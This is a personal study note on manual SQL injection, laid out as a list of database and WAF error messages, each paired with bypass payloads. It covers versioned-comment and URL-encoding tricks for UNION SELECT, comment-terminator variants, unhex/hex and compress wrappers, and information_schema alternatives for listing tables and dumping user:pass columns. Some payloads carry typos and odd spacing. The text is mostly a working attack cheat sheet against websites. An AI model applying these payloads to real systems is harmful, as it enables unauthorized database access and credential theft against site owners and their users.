# <mark style="background: #FF5582A6;">For Review :</mark> 
[[2-Sql Injection (Basic)]]
# Intro :
## <mark style="background: #FF5582A6;">Attention to errors :</mark> 
on target site that give us several warning during the penetration test, in addition to the main error; which is for the number of columns.
when reducing the number of columns (order by), even if one of the warning is cleared.
we see this as a sign of the loading of the target site and we can go to the next step (union select), and it isn't necessary to continue the step of finding the number of columns untill all the warnings are cleared.
# Errors :
1. Forbidden Or Not Acceptable Or Internal Server Error Or 412 Error:
	- <mark style="background: #FFB86CA6;">/*!12345 */</mark> 
		for example :
		/* !12345union * / /* !12345select * / 1,2,3,4,5,
		/* !12345group_concat(table_name) * /,7,8,9 /* !12345from * / 
		/* !12345information_schema * /./* !12345tables * / where table_schema=database()--
	### <mark style="background: #FF5582A6;">Point 1 :</mark> 
	if the above bypass doesn't work :
    - <mark style="background: #FFB86CA6;">%23AAAAA%0aunion %23AAAAA%0aselect ...</mark> 
	 (%23AAAAA%0a it's only use for union and select)
      if the above bypass doesn't work again :
	URL Encode :
     - we hex the first u of the union and the first s of the select and put the % instead of 0x.
		(u in union ---> 0x75 ---> %75 ---> %75nion)
		(s in select ---> 0x73 ---> %73 ---> %73elct)

	<mark style="background: #FF5582A6;">other bypass : </mark> 
	- (union) (select)
	- (uni)(on) (sel)(ect)
	- uni * on sel * ect
	   (there are no spaces in the command, except between union and select)
	- uni/ * * /ion sel/ * * /ect
	   (there are no spaces in the command, except between union and select)
	- uni%0bon sel%0bect
	- %2575nion %2575elect
	   (in addition to the first letter, we have also hexed : %)

	  ### <mark style="background: #FF5582A6;">Point 2 :</mark> 
	  if the problem isn't solved with these bypasses :
	- we turn on the CapsLock and from each of the words of our command code, we wirte which letter is randomly capitalized.
	   if the problem is still not solved, we should see which of the words in our code the target site is sensitive to.
	   in such a way that :
	- first, we delete the <mark style="background: #FF5582A6;">group_concat</mark> so that only the <mark style="background: #FF5582A6;">table_name</mark> remains.
	- if the problem wasn't from the <mark style="background: #FF5582A6;">group_concat</mark> , we delete our commands from the <mark style="background: #FF5582A6;">from</mark> to the end, so that only the <mark style="background: #FF5582A6;">table_name</mark> remains and instead of the <mark style="background: #FF5582A6;">table_name</mark> we wirte <mark style="background: #FF5582A6;">the corresponding column number</mark>. if it's loaded correctly, it means that 100% of the problem is from <mark style="background: #FF5582A6;">table_name</mark> . there is no replacement for table_name, so we continue the target with :
	- [[9-Version 4]]

2. the used SELECT statements have a different number of columns :
	1. [[12-Xpath Injection]]
	2. Point 1 in third step in [[2-Sql Injection (Basic)]]
		((-) behind the ?id number and etc)
	3. Change directory

3. Illegal mix of collation for operation 'UNION' :
	- <mark style="background: #FFB86CA6;">unhex(hex(group_concat(table_name)))</mark> 
		(it also used for when <mark style="background: #FF5582A6;">the important table doesn't show us any column</mark> )

4. Permission Denied in first step :
	- <mark style="background: #FFB86CA6;">using group by instead of order by</mark> 

5. if we see a ('/') in the error, it means that the site is sensitive to quotations.

6. Redirecting the page :
	if the page redirecting by typing quotation at the end of the URL, it means it goes to another page, we typing (order by 9999--) which will probably be redirecting again, but if we typing (order by 1--) and the page isn't redirectiong, so being redirecting means the site isn't load or it's an error.
	therefore, we find the number of columns in the same way as we learned in the
	[[2-Sql Injection (Basic)]].

7. Table 'the name of table' doesn't exist :
	we must write the name of the database before the important table :
	- <mark style="background: #FFB86CA6;">the name of database<mark style="background: #FF5582A6;">.</mark> the important table</mark> 
	if the site has several database with :
	- <mark style="background: #FFB86CA6;">union select group_concat(schema_name) from information_schema.schemata--</mark> 
	we find all databases of the site and put them one by one before the important table to find out which database is for the important table.

8. Service Unavailable Error :
	<mark style="background: #FF5582A6;">sensitive to group_concat</mark> 
	when we delete the group_concat, the site only show us one table.
	so we use :
	[[6-Limit (Method)]]
	to see rest of the tables one by one.

9. We may encounter a <mark style="background: #FF5582A6;">fatal error or Illegal mix of collation for operation 'UNION' </mark> in one of the following stage :
	1. group_concat(table_name)
	2. group_concat(column_name)
	3. group_concat(user,0x3a,pass)
	
	(Or don't display the information and don't have any error Or display the information but have an initial error)
	the bypass is as follows :
	- <mark style="background: #FFB86CA6;">unhex(hex(group_concat(table_name)))</mark> 

	if the problem isn't solved :
	- <mark style="background: #FFB86CA6;">uncompress(compress(group_concat(table_name)))</mark> 

	if in third stage encounter to above errors, in addition to these ways for solve the problem also we can :
	- we turn on the CapsLock and from each of the words of our command code, we wirte which letter is randomly capitalized.
	  (Except unhex, hex, important table, important columns).

10. The target site sensitive to tables (in the phrase : <mark style="background: #FF5582A6;">from information_schema.tables</mark> ),
     Tables alternatives :
	- <mark style="background: #FFB86CA6;">from information_schema.statistics--</mark> 
	- <mark style="background: #FFB86CA6;">from information_schema.partitions--</mark> 

11. The target site sensitive to : <mark style="background: #FF5582A6;">where table_schema=database()--</mark> 
	the alternative to the above command code is :
	- <mark style="background: #FFB86CA6;">from information_schema.keys_column_usage--</mark> 

12. If in the <mark style="background: #FF5582A6;">group_concat</mark> step, the target page became wihte with no text :
	- <mark style="background: #FFB86CA6;">unhex(hex(group_concat(table_name)))</mark> 

13. Some site have limitations on character printing, so when we delete (br in '<>'),
    the target site may show us more important characters.
    
    When a site has a character limit, we have to delete the <mark style="background: #FF5582A6;">group_concat</mark> , sometimes it displays all the tables one by one without <mark style="background: #FF5582A6;">group_concat</mark> , but if it doesn't happen like this : [[6-Limit (Method)]]

14. If with :
	- <mark style="background: #FF5582A6;">?id=1 order by 9999--</mark> 
	the site was loaded, according to what we learned, we know the site shouldn't be loaded, so we write :
	- <mark style="background: #FF5582A6;">?id=1' order by 9999--+</mark> 
	if we encounter an <mark style="background: #FF5582A6;">forbidden</mark> at this step, we give the possibility that the site is <mark style="background: #FF5582A6;">sensitive to quotation ( ' ) or +</mark> .
	of course, there is no need to encounter an forbidden and when we use (' +)
	and ('order by 9999--+) and ('order by 1--+) gave us an error, we should doubt that the site is sensitive to + at the end of our command.
	quotation has no replacement, but the + in last of the our command can be changed in the following ways :
	1. -- -
	2. +--+
	3. +--+-
	4. --#
	5. -- * /          (there are no spaces in the command) 
	6. --/ * * /      (there are no spaces in the command)
	7. --* / * * /    (there are no spaces in the command)

15. If a site delete the <mark style="background: #FF5582A6;">union select</mark> , it means, that the site is sensitive to <mark style="background: #FF5582A6;">union select</mark> 
     so we do this :
       - <mark style="background: #FFB86CA6;">UNIunionON SELselectECT</mark> 

16. if important tables are not shown in the source ([[5-Source (Method)]]) :
	- <mark style="background: #FFB86CA6;">unhex(hex(group_concat(table_name)))</mark> 

17. when we tarnslated the important table or important columns of a non-English site and saw the confused and strange letters that were not understandabe, instead of <mark style="background: #FF5582A6;">unhex(hex(group_concat(table_name)))</mark> we write :
	 - <mark style="background: #FFB86CA6;">binary(group_concat(table_name))</mark> 